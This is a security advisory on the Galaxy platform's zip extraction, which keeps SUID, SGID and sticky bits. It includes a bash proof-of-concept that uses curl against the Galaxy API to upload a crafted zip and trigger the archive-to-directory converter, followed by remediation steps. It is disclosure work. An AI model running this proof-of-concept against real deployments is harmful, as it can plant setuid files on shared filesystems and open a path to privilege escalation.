# HG-2026-002: Zip Archive-to-Directory Converter Preserves SUID/Sticky Bit

### Summary

`galaxy.util.compression_utils.CompressedFile.extract()` preserves special bits such as SUID, SGID, STICKY (unlike tar extraction).
Whether this is exploitable depends on the deployment topology (which runners, which tool, which converter, which runners run as, NFS and CVMFS settings, ...).

In theory no job should ever run with elevated privileges, but that is not the regular case in Galaxy platform and it's pretty usual to find a container or tool with a non-root user but the container itself run as root or a container run as UID 999 BUT without strict restrict on new privilege capability.

Most production deployments using HTTP transport for staging are out of scope: permissions are dropped accidentally (`shutil.copyfile`). Scope is mostly mounted job working directories.

Whether this primitive can be pivoted to privilege escalation depends on the deployment topology and in most case not.

Some quick example the tool process runs as `foo`, the container runs as `root`, and someone thought that was fine for production. Congrats, `foo` just get access to a SUID binary on a shared filesystem. I will not provide full path on how to use this use your imagination and if you cant it's ok move on.

Galaxy didn't even break a sweat.

### Details

PR ready for review: `2fe762b#diff-e60ef81f16cb699338ff285c16d38c3ca08802f2aadec06b8dbc0ad8424e0576`

![intermediate step bits](pictures/intermediate-step-bits.png)



### PoC

```bash
#!/bin/bash
set -eux 

source ../.env

# 1. Create history
# 2. Upload zip as plain dataset (no auto_decompress)
# 3. Wait for upload to finish (poll state)
# 4. Invoke the converter to convert zip to directory (which should trigger the suid
# Not the only path to trigger the code, simplified for the PoC
#    binary execution if the vulnerability is present)
# use GA workflow to validate it afterward

HID=$(curl -s -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d '{"name":"suid_test"}' "$GALAXY_URL/api/histories" | jq -r '.id')

UPLOAD=$(curl -s -H "x-api-key: $API_KEY" \
  -F "history_id=$HID" \
  -F "tool_id=upload1" \
  -F 'inputs={"file_type":"zip","dbkey":"?","files_0|type":"upload_dataset","files_0|auto_decompress":false}' \
  -F "files_0|file_data=@artefacts/suid_real.zip" \
  "$GALAXY_URL/api/tools")

DID=$(echo "$UPLOAD" | jq -r '.outputs[0].id')
echo "dataset id: $DID"

while [ "$(curl -s -H "x-api-key: $API_KEY" "$GALAXY_URL/api/datasets/$DID" | jq -r .state)" != "ok" ]; do
  sleep 1
done
sleep 20

curl -s -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d "{
        \"tool_id\":\"CONVERTER_archive_to_directory\",
        \"history_id\":\"$HID\",
        \"inputs\":{
          \"input1\":{\"src\":\"hda\",\"id\":\"$DID\"},
          \"__target_datatype__\":\"directory\"
        }
      }" \
  "$GALAXY_URL/api/tools" | jq .
```

### Impact

Authenticated user can cause arbitrary special mode bits to files extracted.
End to exploitability varies by topology:

- Runner
- Tools
- Shared FS / settings
- Transport between Runner and Galaxy

All Galaxy versions on the current dev branch and prior releases. Fix is a one-line mask at the sink, equivalent in policy to what `tarfile.data_filter` already enforces for tar archives in the same module.

### Remediation

- **Code fix (sink):** mask special bits in `CompressedFile.extract()` to match what `tarfile.data_filter` already does for tar archives in the same module.
- **Docker:** drop `CAP_SETUID` / `CAP_SETGID` from runner containers (`--cap-drop=ALL`, `no-new-privileges`). A rootless container should be use if possible.
- **NFS:** mount job working directories and shared datasets with `nosuid`. Prevents the kernel from honoring SUID/SGID bits on that filesystem regardless of what bits are written.
- **CVMFS:** set `CVMFS_SUID=no` (or equivalent repository option). CVMFS repos are read-only by design, but the flag ensures the client never presents SUID bits to the kernel even if the repository somehow contains them.
